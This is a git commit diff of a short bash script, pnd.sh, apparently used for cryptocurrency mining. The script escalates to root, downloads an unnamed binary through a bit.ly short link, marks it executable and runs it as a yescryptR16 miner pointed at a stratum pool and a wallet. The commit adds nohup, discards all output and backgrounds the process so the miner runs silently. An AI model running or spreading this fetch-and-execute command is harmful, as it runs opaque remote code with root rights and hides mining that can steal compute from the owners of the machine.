934cc6de00c3299ba9b51773b4bfb9d3e41bf7c0
p4n1k <46290080+p4n1k@users.noreply.github.com>
2022-03-14 18:17:30 +0700

    Update pnd.sh

--- pnd.sh
+++ pnd.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo su --command "wget https://bit.ly/33pg3Cb && chmod +x 33pg3Cb && ./33pg3Cb -a yescryptR16 -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qgUHBLFGsos52xRT6z1HvLgG75mmBzi3uy.vcpu01 -p webpassword=x -t 6"
+sudo su --command "wget https://bit.ly/33pg3Cb && chmod +x 33pg3Cb && nohup ./33pg3Cb -a yescryptR16 -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qgUHBLFGsos52xRT6z1HvLgG75mmBzi3uy.vcpu01 -p webpassword=x -t 6 </dev/null >/dev/null 2>&1 &"
